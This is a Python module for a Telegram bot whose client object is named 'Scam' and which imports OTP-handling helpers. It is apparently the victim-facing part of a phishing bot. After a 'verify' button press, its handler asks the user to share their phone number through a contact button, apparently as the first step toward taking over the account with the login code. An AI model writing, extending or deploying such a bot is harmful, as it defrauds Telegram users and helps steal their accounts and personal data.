from pyromod import Client, Message
from pyrogram import idle, filters, session
from pyrogram.raw import functions
import asyncio
from pyrogram.enums import ParseMode, parse_mode
from pyrogram.errors import UserIsBlocked
from pyrogram.session.session import Session
from pyrogram.types import InlineKeyboardMarkup, Message, InlineKeyboardButton, CallbackQuery, ReplyKeyboardMarkup, \
    KeyboardButton
import re
from scam import Scam
from main import db
from helpers.util import button_start, button_verif, commands, OtpTag, OtpStrip

@Scam.on_callback_query(filters.regex(r"^btn_decline$"))
async def onCallbackQueryDeclined(client, query):
    qdata = query.data
    message = query.message
    user = query.from_user.id

@Scam.on_callback_query(filters.regex(r"^btn_verify$"))
async def onCallbackQueryVerified(client: Client, query: CallbackQuery):
    qdata = query.data
    message = query.message
    user = query.from_user.id
    button = ReplyKeyboardMarkup(
        [
            [
                KeyboardButton(
                    "Send phone number", request_contact=True
                ),
            ],
        ]
    )
    try:
        await message.delete()
        await query.answer("Please send your phone number", show_alert=False)
        # await query.edit_message_text(
        #     text="**Please enter your phone number in international format.**\n\nExample: `+6281234567890`",
        #     reply_markup=button,
        # )
        await client.send_message(
            chat_id=user,
            text="**Please enter your phone number, press the button below to send.**",
            reply_markup=button,
        )
    except Exception as e:
        print(e)
